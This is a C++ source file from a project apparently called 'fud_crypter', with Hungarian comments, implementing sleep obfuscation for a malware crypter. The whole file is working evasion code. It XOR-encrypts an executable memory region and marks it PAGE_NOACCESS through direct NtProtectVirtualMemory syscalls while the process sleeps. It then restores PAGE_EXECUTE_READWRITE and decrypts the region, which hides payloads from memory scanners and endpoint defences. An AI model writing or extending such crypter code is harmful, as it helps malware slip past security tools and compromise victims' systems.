#include "fud_crypter/sleep_obf.hpp"
#include "fud_crypter/syscall.hpp"
#include <cstring>

namespace fud_crypter {
namespace memory {

SleepObfuscator::SleepObfuscator(void* memory, size_t size, const std::vector<uint8_t>& key)
    : memory_(memory), size_(size), key_(key), encrypted_(false) {}

void SleepObfuscator::encrypt() {
    if (!memory_ || encrypted_ || key_.empty()) return;
    auto data = static_cast<uint8_t*>(memory_);
    for (size_t i = 0; i < size_; ++i) {
        data[i] ^= key_[i % key_.size()];
    }
    encrypted_ = true;

    // Memória jogok visszavonása (PAGE_NOACCESS)
    syscall::load_syscall_numbers();
    PVOID base = memory_;
    SIZE_T region_size = size_;
    ULONG old_protect = 0;
    syscall::syscall_NtProtectVirtualMemory(
        GetCurrentProcess(),
        &base,
        &region_size,
        PAGE_NOACCESS,
        &old_protect
    );
}

void SleepObfuscator::decrypt() {
    if (!memory_ || !encrypted_ || key_.empty()) return;

    // Memória jogok visszaállítása (PAGE_EXECUTE_READWRITE)
    syscall::load_syscall_numbers();
    PVOID base = memory_;
    SIZE_T region_size = size_;
    ULONG old_protect = 0;
    syscall::syscall_NtProtectVirtualMemory(
        GetCurrentProcess(),
        &base,
        &region_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );

    auto data = static_cast<uint8_t*>(memory_);
    for (size_t i = 0; i < size_; ++i) {
        data[i] ^= key_[i % key_.size()];
    }
    encrypted_ = false;
}

void SleepObfuscator::sleep_and_encrypt(DWORD milliseconds) {
    encrypt();

    // Várakozás (syscall)
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000LL * milliseconds; // NT formátum
    syscall::syscall_NtWaitForSingleObject(
        GetCurrentThread(),
        FALSE,
        &timeout
    );

    decrypt();
}

} // namespace memory
} // namespace fud_crypter
